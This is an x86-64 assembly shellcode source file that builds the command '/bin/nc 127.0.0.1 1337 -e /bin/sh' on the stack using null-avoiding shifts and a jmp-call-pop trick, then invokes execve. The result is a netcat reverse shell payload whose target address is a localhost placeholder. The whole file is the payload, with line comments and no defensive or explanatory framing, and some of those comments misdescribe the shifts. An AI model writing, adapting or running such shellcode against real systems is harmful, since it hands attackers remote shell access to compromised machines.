section .text
    global _start

_start:
    ; Zero out RDX
    xor     rdx, rdx

    ; Setting up the command for netcat ("/bin/nc")
    mov     rdi, 0x636e2f6e69622fff    ; "/bin/nc" in hexadecimal
    shr     rdi, 8                     ; Shift right by 8 bits to remove the last byte
    push    rdi                        ; Push the command string onto the stack
    mov     rdi, rsp                   ; Move the stack pointer into RDI

    ; Setting up the command to execute ("/bin/sh")
    mov     rcx, 0x68732f6e69622fff    ; "/bin/sh" in hexadecimal
    shr     rcx, 8                     ; Shift right by 8 bits to remove the last byte
    push    rcx                        ; Push the command string onto the stack
    mov     rcx, rsp                   ; Move the stack pointer into RCX

    ; Setting up the argument for netcat ("-e")
    mov     rbx, 0x652dffffffffffff    ; "-e" in hexadecimal
    shr     rbx, 0x30                  ; Shift right by 48 bits to remove the last byte
    push    rbx                        ; Push the argument onto the stack
    mov     rbx, rsp                   ; Move the stack pointer into RBX

    ; Setting up the port number ("1337")
    mov     r10, 0x37333331ffffffff    ; "1337" in hexadecimal
    shr     r10, 0x20                  ; Shift right by 32 bits to remove the last 2 bytes
    push    r10                        ; Push the port number onto the stack
    mov     r10, rsp                   ; Move the stack pointer into R10

    ; Call the function to organize arguments
    jmp     short ip

continuar:
    pop     r9                         ; Pop the IP address into R9
    push    rdx                        ; Push NULL onto the stack
    push    rcx                        ; Push the address of "/bin/sh"
    push    rbx                        ; Push the address of the argument "-e"
    push    r10                        ; Push the address of the port number
    push    r9                         ; Push the address of the IP
    push    rdi                        ; Push the address of "/bin/nc"

    ; Set up execve syscall
    mov     rsi, rsp                   ; Move the stack pointer into RSI
    mov     al, 59                     ; Set syscall number 59 for execve
    syscall                            ; Invoke the syscall

ip:
    call    continuar                  ; Call the function to organize arguments
    db "127.0.0.1"                     ; IP address in string format
